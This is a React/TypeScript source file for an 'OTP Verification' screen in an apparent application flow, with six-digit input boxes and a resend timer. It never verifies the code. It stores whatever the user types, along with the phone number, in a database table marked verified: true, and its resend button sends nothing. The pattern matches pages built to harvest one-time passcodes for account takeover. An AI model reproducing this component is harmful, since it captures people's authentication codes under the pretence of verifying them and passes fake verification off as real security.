import { useState, useRef, useEffect } from 'react';
import { supabase } from '../lib/supabase';

interface OTPVerificationProps {
  applicationId: string;
  phoneNumber: string;
  onNext: () => void;
}

export default function OTPVerification({ applicationId, phoneNumber, onNext }: OTPVerificationProps) {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(107);
  const [error, setError] = useState<string>('');
  const otpRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) value = value[0];
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      otpRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs[index - 1].current?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const otpCode = otp.join('');
      const { error: dbError } = await supabase
        .from('otp_verifications')
        .insert({
          application_id: applicationId,
          phone_number: phoneNumber,
          otp_code: otpCode,
          verified: true,
        });

      if (dbError) {
        setError(dbError.message || 'OTP verification failed');
        console.error('Database error:', dbError);
        return;
      }

      onNext();
    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : 'An error occurred';
      setError(errorMsg);
      console.error('Error submitting OTP:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleResend = () => {
    setCountdown(107);
    setOtp(['', '', '', '', '', '']);
    otpRefs[0].current?.focus();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyan-50 via-blue-50 to-blue-100 relative overflow-hidden">
      <div className="absolute inset-0 opacity-10">
        <svg className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <pattern id="network" x="0" y="0" width="100" height="100" patternUnits="userSpaceOnUse">
              <circle cx="50" cy="50" r="2" fill="#3b82f6" />
              <line x1="50" y1="50" x2="80" y2="30" stroke="#3b82f6" strokeWidth="0.5" />
              <line x1="50" y1="50" x2="20" y2="70" stroke="#3b82f6" strokeWidth="0.5" />
              <line x1="50" y1="50" x2="60" y2="80" stroke="#3b82f6" strokeWidth="0.5" />
            </pattern>
          </defs>
          <rect width="100%" height="100%" fill="url(#network)" />
        </svg>
      </div>

      <div className="relative min-h-screen flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <h2 className="text-3xl font-bold text-center text-gray-800 mb-4">OTP Verification</h2>
            <p className="text-center text-gray-600 mb-2">Enter the OTP sent to your number</p>
            <p className="text-center text-gray-800 font-semibold mb-8">{phoneNumber}</p>

            {error && (
              <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-red-800 text-sm">{error}</p>
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="flex gap-2 justify-center">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={otpRefs[index]}
                    type="text"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className="w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition"
                  />
                ))}
              </div>

              <button
                type="submit"
                disabled={loading || otp.some(d => !d)}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Verifying...' : 'Submit'}
              </button>

              <div className="text-center space-y-2">
                <p className="text-gray-600">
                  Resend OTP in <span className="font-semibold">{countdown}</span> seconds
                </p>
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={countdown > 0}
                  className="w-full py-3 text-gray-600 font-semibold rounded-lg border border-gray-300 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-50 transition"
                >
                  Resend OTP
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
